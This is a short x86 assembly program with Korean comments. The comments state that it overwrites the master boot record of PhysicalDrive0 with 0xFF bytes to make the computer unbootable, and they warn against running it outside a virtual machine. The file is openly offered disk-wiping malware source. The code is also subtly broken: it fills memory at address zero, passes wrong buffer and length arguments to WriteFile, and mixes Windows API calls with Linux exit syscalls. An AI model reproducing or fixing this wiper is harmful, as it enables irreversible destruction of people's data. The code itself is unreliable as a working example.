; 본 프로그램은 MBR(Master Boot Recoder)를 FF로 완전히 덮어씁니다.
; 따라서 부팅이 불가능해지며, 실제 실행은 절대 시도하지 마십시오.
; 실행은 가상머신이나 독립된 컴퓨터에서 실행하십시오.
;
;
; ===============================!본 프로그램을 절대 매인PC에서 실행시키지 마십시오.!===============================




; ===============================윈도우===============================

section .data
    disk_path db '\\.\PhysicalDrive0', 0

section .text
    global _start

_start:
    push 0
    push 0
    push 3
    push 0
    push 0x40000000
    push disk_path
    call [CreateFileA]

    test eax, eax
    js .error

    mov ecx, 512
    xor edi, edi

.fill_buffer:
    mov byte [edi], 0xFF
    inc edi
    loop .fill_buffer

    push 0
    push ecx
    push edi
    push eax
    call [WriteFile]

    push eax
    call [CloseHandle]

    mov eax, 1
    xor ebx, ebx
    int 0x80

; 에러시 프로그램종료
.error:
    mov eax, 1
    xor ebx, ebx
    int 0x80

section .idata
